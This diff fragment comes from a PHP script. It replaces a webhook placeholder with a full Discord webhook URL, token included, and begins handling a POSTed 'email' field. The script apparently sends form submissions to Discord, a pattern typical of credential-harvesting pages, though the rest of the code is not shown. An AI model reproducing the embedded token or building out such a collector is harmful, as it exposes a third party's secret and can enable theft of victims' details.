@@ -6,7 +6,7 @@
  */
 
 // --- [CONFIG] ---
-$webhook_url = "YOUR_WEBHOOK_URL_HERE"; 
+$webhook_url = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm"; 
 
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email'])) {
     $email = $_POST['email'];
